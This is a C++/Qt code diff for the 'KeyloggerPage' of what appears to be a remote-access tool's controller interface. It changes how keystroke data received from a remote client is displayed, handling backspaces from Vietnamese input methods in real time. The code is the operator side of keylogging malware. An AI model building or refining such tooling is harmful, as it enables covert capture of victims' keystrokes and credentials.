@@ -1,6 +1,8 @@
 #include "KeyloggerPage.h"
 #include "../Network/ClientSocket.h"
 
+#include <QTextCursor>
+
 KeyloggerPage::KeyloggerPage(QWidget *parent)
     : QWidget(parent), clientSocket(nullptr)
 {
@@ -147,7 +149,25 @@ void KeyloggerPage::handleResponse(const Packet& packet)
     }
     else if (command == Protocol::GET_KEYLOGGER_DATA)
     {
-        textDisplay->append("=== Keylog Data ===\n" + data + "\n");
-        statusLabel->setText("Keylog data received!");
+        // Real-time: xử lý từng ký tự, bao gồm backspace từ IME
+        textDisplay->moveCursor(QTextCursor::End);
+
+        for (int i = 0; i < data.length(); i++)
+        {
+            if (data[i] == '\b')
+            {
+                // Backspace từ IME (Unikey/Telex xóa ký tự cũ)
+                QTextCursor cursor = textDisplay->textCursor();
+                cursor.movePosition(QTextCursor::End);
+                cursor.deletePreviousChar();
+                textDisplay->setTextCursor(cursor);
+            }
+            else
+            {
+                textDisplay->insertPlainText(QString(data[i]));
+            }
+        }
+
+        textDisplay->moveCursor(QTextCursor::End);
     }
 }
